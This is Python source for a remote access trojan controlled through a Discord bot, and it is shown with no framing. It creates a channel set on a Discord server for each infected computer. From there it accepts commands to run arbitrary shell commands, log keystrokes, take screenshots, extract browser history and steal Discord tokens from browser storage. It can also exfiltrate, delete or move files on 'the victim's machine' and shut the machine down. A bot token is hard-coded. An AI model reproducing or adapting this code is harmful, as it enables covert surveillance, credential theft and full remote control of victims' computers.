import discord
import subprocess
import threading
import asyncio
import os
import socket
import platform
import re
import requests
from discord import File, Embed
from pynput import keyboard  # For keylogging
from PIL import ImageGrab  # For screenshots (macOS/Linux)
import sqlite3
import shutil

# Constants
DISCORD_TOKEN = "MTM1MDU2OTkxNDk0Mjg4MTg4NQ.G7SNZv.-s0fEvm6XmQLAArdHGWBngo2YV0sfr6biaXC2Q"
SERVER_ID = 1350570142681141381
CHANNELS = ["commands", "recordings", "mic-listening", "logs", "files", "keylogger"]
COMMAND_PREFIX = ","
KEYLOG_FILE = "keylog.txt"
TOKEN_LOG_FILE = "discord_tokens.txt"

def get_system_info():
    """Retrieve system information."""
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    return {
        "hostname": hostname,
        "ip": ip,
        "os": platform.system(),
        "architecture": platform.machine(),
        "key": f"pc-{ip}"  # Unique key for this computer
    }

async def execute_shell_command(command):
    """Execute a shell command asynchronously."""
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        return stdout.decode() if process.returncode == 0 else stderr.decode()
    except Exception as e:
        return f"Error executing command: {e}"

def download_file(url, save_path):
    """Download a file from a URL."""
    try:
        response = requests.get(url)
        with open(save_path, "wb") as f:
            f.write(response.content)
        return f"Downloaded file to: {save_path}"
    except Exception as e:
        return f"Error downloading file: {e}"

def take_screenshot():
    """Take a screenshot (cross-platform)."""
    try:
        if platform.system() == "Windows":
            import pyautogui
            screenshot = pyautogui.screenshot()
        elif platform.system() in ["Darwin", "Linux"]:  # macOS or Linux
            screenshot = ImageGrab.grab()
        else:
            return "Screenshots are not supported on this OS."
        
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        return f"Error taking screenshot: {e}"

def set_volume_windows(volume_level):
    """Set system volume on Windows."""
    if platform.system() != "Windows":
        return "Volume control is only supported on Windows."
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(volume_level / 100, None)
        return f"Volume set to {volume_level}%"
    except Exception as e:
        return f"Error setting volume: {e}"

def search_history_windows():
    """Extract browser search history on Windows."""
    if platform.system() != "Windows":
        return "Search history extraction is only supported on Windows."
    
    search_history = []
    browsers = {
        "Chrome": os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\History"),
        "Edge": os.path.expandvars(r"%localappdata%\Microsoft\Edge\User Data\Default\History"),
        "Brave": os.path.expandvars(r"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History"),
        "Firefox": os.path.expandvars(r"%appdata%\Mozilla\Firefox\Profiles"),
    }

    for browser, path in browsers.items():
        if os.path.exists(path):
            if browser == "Firefox":
                profile_folders = [f for f in os.listdir(path) if f.endswith(".default-release")]
                for folder in profile_folders:
                    db_path = os.path.join(path, folder, "places.sqlite")
                    if os.path.exists(db_path):
                        try:
                            conn = sqlite3.connect(db_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title FROM moz_places;")
                            search_history.extend(cursor.fetchall())
                            conn.close()
                        except Exception as e:
                            print(f"Error accessing Firefox history: {e}")
            else:
                try:
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title FROM urls;")
                    search_history.extend(cursor.fetchall())
                    conn.close()
                except Exception as e:
                    print(f"Error accessing {browser} history: {e}")
    return search_history

def list_files(directory="."):
    """List files in a directory."""
    try:
        return "\n".join(os.listdir(directory))
    except Exception as e:
        return f"Error listing files: {e}"

def get_discord_tokens():
    """Extract Discord tokens from common browser storage locations."""
    if platform.system() != "Windows":
        return "Discord token extraction is only supported on Windows."

    token_paths = {
        "Discord": os.path.expandvars(r"%appdata%\discord\Local Storage\leveldb"),
        "Chrome": os.path.expandvars(r"%localappdata%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
        "Edge": os.path.expandvars(r"%localappdata%\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
        "Brave": os.path.expandvars(r"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
        "Firefox": os.path.expandvars(r"%appdata%\Mozilla\Firefox\Profiles"),
    }

    tokens = []

    for browser, path in token_paths.items():
        if os.path.exists(path):
            if browser == "Firefox":
                profile_folders = [f for f in os.listdir(path) if f.endswith(".default-release")]
                for folder in profile_folders:
                    db_path = os.path.join(path, folder, "webappsstore.sqlite")
                    if os.path.exists(db_path):
                        try:
                            conn = sqlite3.connect(db_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT key, value FROM webappsstore2;")
                            for row in cursor.fetchall():
                                if "token" in row[0]:
                                    tokens.append(row[1])
                            conn.close()
                        except Exception as e:
                            print(f"Error accessing Firefox tokens: {e}")
            else:
                try:
                    for root, _, files in os.walk(path):
                        for file in files:
                            if file.endswith((".ldb", ".log")):
                                with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read()
                                    matches = re.findall(r'"token":"([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})"', content)
                                    tokens.extend(matches)
                except Exception as e:
                    print(f"Error accessing {browser} tokens: {e}")
    return list(set(tokens))  # Remove duplicates

# Start keylogging
def on_press(key):
    """Log each key press."""
    try:
        with open(KEYLOG_FILE, "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Error writing to keylog file: {e}")

def start_keylogging():
    """Start logging keystrokes."""
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    except Exception as e:
        print(f"Error starting keylogger: {e}")

# Initialize the Discord client
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"Bot connected to Discord as {client.user}")
    
    # Start keylogging
    threading.Thread(target=start_keylogging, daemon=True).start()

    # Get the server
    guild = client.get_guild(SERVER_ID)
    if not guild:
        print("Could not find the server.")
        return

    # Get system info
    info = get_system_info()

    # Create a category for this computer (if it doesn't exist)
    category_name = info["key"]
    category = discord.utils.get(guild.categories, name=category_name)
    if not category:
        category = await guild.create_category(category_name)
        print(f"Created category: {category_name}")

    # Create channels within the category (if they don't exist)
    existing_channels = [channel.name for channel in category.text_channels]
    for channel_name in CHANNELS:
        if channel_name not in existing_channels:
            await guild.create_text_channel(channel_name, category=category)
            print(f"Created channel: #{channel_name} in category {category_name}")

    # Log system information
    logs_channel = discord.utils.get(category.text_channels, name="logs")
    if logs_channel:
        embed = Embed(title="System Information", color=discord.Color.blue())
        for key, value in info.items():
            embed.add_field(name=key.capitalize(), value=value, inline=False)
        await logs_channel.send(embed=embed)

@client.event
async def on_message(message):
    # Ignore messages from the bot itself
    if message.author == client.user:
        return

    # Ensure the bot only responds in its own category's #commands channel
    info = get_system_info()
    category_name = info["key"]
    category = discord.utils.get(message.guild.categories, name=category_name)
    if not category or message.channel.category != category or message.channel.name != "commands":
        return

    # Parse the command
    content = message.content.strip()
    if not content.startswith(COMMAND_PREFIX):
        return

    command = content[len(COMMAND_PREFIX):].strip().lower()

    if command == "help":
        # Display help message
        embed = Embed(title="Help Menu", description="Available Commands:", color=discord.Color.green())
        embed.add_field(name=",exec <command>", value="Execute a shell command.", inline=False)
        embed.add_field(name=",info", value="Retrieve system information.", inline=False)
        embed.add_field(name=",upload-url <url>", value="Upload a file from a URL.", inline=False)
        embed.add_field(name=",upload-file", value="Upload a file attached to the message.", inline=False)
        embed.add_field(name=",screenshot", value="Take a screenshot.", inline=False)
        embed.add_field(name=",set-volume <level>", value="Set system volume (Windows only).", inline=False)
        embed.add_field(name=",list-files", value="List files in the current directory.", inline=False)
        embed.add_field(name=",search-history", value="Retrieve browser search history (Windows only).", inline=False)
        embed.add_field(name=",download <file_path>", value="Download a file from the victim's machine.", inline=False)
        embed.add_field(name=",delete <file_path>", value="Delete a file on the victim's machine.", inline=False)
        embed.add_field(name=",move <src> <dst>", value="Move a file on the victim's machine.", inline=False)
        embed.add_field(name=",copy <src> <dst>", value="Copy a file on the victim's machine.", inline=False)
        embed.add_field(name=",shutdown", value="Shutdown the system.", inline=False)
        embed.add_field(name=",restart", value="Restart the system.", inline=False)
        embed.add_field(name=",keylog", value="Retrieve the keylog file.", inline=False)
        embed.add_field(name=",ping", value="Check the bot's latency.", inline=False)
        embed.add_field(name=",get-discord-tokens", value="Retrieve Discord tokens from common browsers (Windows only).", inline=False)
        embed.add_field(name=",help", value="Display this help message.", inline=False)
        await message.channel.send(embed=embed)

    elif command.startswith("exec "):
        # Execute shell command
        cmd = command[5:]
        output = await execute_shell_command(cmd)
        embed = Embed(title="Command Output", description=f"```\n{output}\n```", color=discord.Color.blue())
        await message.channel.send(embed=embed)

    elif command == "info":
        # Send system info
        info = get_system_info()
        embed = Embed(title="System Information", color=discord.Color.blue())
        for key, value in info.items():
            embed.add_field(name=key.capitalize(), value=value, inline=False)
        await message.channel.send(embed=embed)

    elif command.startswith("upload-url "):
        # Upload a file from a URL
        try:
            url = command.split(" ")[1]
            save_path = os.path.basename(url)  # Extract filename from URL
            result = download_file(url, save_path)
            embed = Embed(title="File Download", description=result, color=discord.Color.green())
            await message.channel.send(embed=embed)
            if os.path.exists(save_path):
                await message.channel.send(file=discord.File(save_path))
                os.remove(save_path)  # Clean up the file after uploading
        except Exception as e:
            embed = Embed(title="Error", description=f"Error processing upload-url: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("upload-file"):
        # Upload a file attached to the message
        if len(message.attachments) == 0:
            embed = Embed(title="Error", description="No file attached to the message.", color=discord.Color.red())
            await message.channel.send(embed=embed)
            return

        attachment = message.attachments[0]
        save_path = attachment.filename
        try:
            await attachment.save(save_path)
            embed = Embed(title="File Upload", description=f"File saved locally: {save_path}", color=discord.Color.green())
            await message.channel.send(embed=embed)
            await message.channel.send(file=discord.File(save_path))
            os.remove(save_path)  # Clean up the file after uploading
        except Exception as e:
            embed = Embed(title="Error", description=f"Error processing upload-file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "screenshot":
        # Take a screenshot
        screenshot_path = take_screenshot()
        if os.path.exists(screenshot_path):
            await message.channel.send(file=discord.File(screenshot_path))
            os.remove(screenshot_path)  # Clean up the file after uploading
        else:
            embed = Embed(title="Error", description="Failed to take screenshot.", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("set-volume "):
        # Set system volume (Windows only)
        try:
            volume_level = int(command.split(" ")[1])
            result = set_volume_windows(volume_level)
            embed = Embed(title="Volume Control", description=result, color=discord.Color.green())
            await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Invalid volume level: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "list-files":
        # List files in the current directory
        output = list_files()
        embed = Embed(title="Files in Directory", description=f"```\n{output}\n```", color=discord.Color.blue())
        await message.channel.send(embed=embed)

    elif command == "search-history":
        # Get search history (Windows only)
        if platform.system() == "Windows":
            history = search_history_windows()
            if history:
                history_message = "\n".join([f"{url} - {title}" for url, title in history])
                embed = Embed(title="Search History", description=f"```\n{history_message}\n```", color=discord.Color.blue())
                await message.channel.send(embed=embed)
            else:
                embed = Embed(title="Search History", description="No search history found.", color=discord.Color.red())
                await message.channel.send(embed=embed)
        else:
            embed = Embed(title="Error", description="Search history is only supported on Windows.", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("download "):
        # Download a file from the victim's machine
        try:
            file_path = command.split(" ")[1]
            if os.path.exists(file_path):
                await message.channel.send(file=discord.File(file_path))
            else:
                embed = Embed(title="Error", description=f"File not found: {file_path}", color=discord.Color.red())
                await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error downloading file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("delete "):
        # Delete a file on the victim's machine
        try:
            file_path = command.split(" ")[1]
            if os.path.exists(file_path):
                os.remove(file_path)
                embed = Embed(title="File Deletion", description=f"Deleted file: {file_path}", color=discord.Color.green())
                await message.channel.send(embed=embed)
            else:
                embed = Embed(title="Error", description=f"File not found: {file_path}", color=discord.Color.red())
                await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error deleting file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("move "):
        # Move a file on the victim's machine
        try:
            args = command.split(" ")
            src = args[1]
            dst = args[2]
            if os.path.exists(src):
                shutil.move(src, dst)
                embed = Embed(title="File Move", description=f"Moved file: {src} -> {dst}", color=discord.Color.green())
                await message.channel.send(embed=embed)
            else:
                embed = Embed(title="Error", description=f"Source file not found: {src}", color=discord.Color.red())
                await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error moving file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command.startswith("copy "):
        # Copy a file on the victim's machine
        try:
            args = command.split(" ")
            src = args[1]
            dst = args[2]
            if os.path.exists(src):
                shutil.copy(src, dst)
                embed = Embed(title="File Copy", description=f"Copied file: {src} -> {dst}", color=discord.Color.green())
                await message.channel.send(embed=embed)
            else:
                embed = Embed(title="Error", description=f"Source file not found: {src}", color=discord.Color.red())
                await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error copying file: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "shutdown":
        # Shutdown the system
        try:
            if platform.system() == "Windows":
                subprocess.run("shutdown /s /t 0", shell=True)
            elif platform.system() in ["Linux", "Darwin"]:
                subprocess.run("sudo shutdown now", shell=True)
            embed = Embed(title="System Shutdown", description="Shutting down the system...", color=discord.Color.green())
            await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error shutting down: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "restart":
        # Restart the system
        try:
            if platform.system() == "Windows":
                subprocess.run("shutdown /r /t 0", shell=True)
            elif platform.system() in ["Linux", "Darwin"]:
                subprocess.run("sudo reboot", shell=True)
            embed = Embed(title="System Restart", description="Restarting the system...", color=discord.Color.green())
            await message.channel.send(embed=embed)
        except Exception as e:
            embed = Embed(title="Error", description=f"Error restarting: {e}", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "keylog":
        # Retrieve the keylog file
        if os.path.exists(KEYLOG_FILE):
            await message.channel.send(file=discord.File(KEYLOG_FILE))
        else:
            embed = Embed(title="Error", description="Keylog file not found.", color=discord.Color.red())
            await message.channel.send(embed=embed)

    elif command == "ping":
        # Check the bot's latency
        latency = round(client.latency * 1000)  # Convert to milliseconds
        embed = Embed(title="Ping", description=f"Pong! Latency: {latency}ms", color=discord.Color.green())
        await message.channel.send(embed=embed)

    elif command == "get-discord-tokens":
        # Retrieve Discord tokens from common browsers (Windows only)
        if platform.system() != "Windows":
            embed = Embed(title="Error", description="Discord token extraction is only supported on Windows.", color=discord.Color.red())
            await message.channel.send(embed=embed)
            return

        tokens = get_discord_tokens()
        if tokens:
            with open(TOKEN_LOG_FILE, "w") as f:
                f.write("\n".join(tokens))
            await message.channel.send(file=discord.File(TOKEN_LOG_FILE))
            os.remove(TOKEN_LOG_FILE)  # Clean up the file after uploading
        else:
            embed = Embed(title="Discord Tokens", description="No Discord tokens found.", color=discord.Color.red())
            await message.channel.send(embed=embed)

    else:
        embed = Embed(title="Error", description="Unknown command. Use `,help` for a list of commands.", color=discord.Color.red())
        await message.channel.send(embed=embed)

# Run the bot
client.run(DISCORD_TOKEN)